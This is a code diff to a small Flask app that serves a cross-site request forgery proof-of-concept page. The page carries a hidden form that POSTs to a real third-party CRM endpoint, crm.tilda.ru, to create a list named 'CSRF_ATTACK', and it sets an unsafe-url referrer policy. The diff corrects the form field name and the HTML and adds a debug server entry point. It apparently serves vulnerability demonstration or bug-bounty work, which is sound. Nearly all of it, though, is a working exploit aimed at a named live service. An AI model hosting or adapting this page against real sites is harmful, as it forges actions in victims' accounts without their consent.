@@ -13,20 +13,20 @@ def csrf_page():
     <head>
     <title>CSRF</title>
     <meta name="referrer" content="unsafe-url">
+    </head>
     <body>
         <form action="https://crm.tilda.ru/submit/" method="POST">
             <input type="hidden" name="lang" value="RU" />
-            <input type="hidden" name="list&#91;name&#93;" value="CSRF_ATTACK" />
+            <input type="hidden" name="lists[name]" value="CSRF_ATTACK" />
             <input type="hidden" name="action" value="list" />
             <input type="submit" value="Submit request" />
         </form>
-        <script>
-
-
-        </script>
     </body>
-</html>
+    </html>
     '''
     response = make_response(html)
     response.headers['Referrer-Policy'] = 'unsafe-url'
     return response
+
+if __name__ == '__main__':
+    app.run(debug=True)
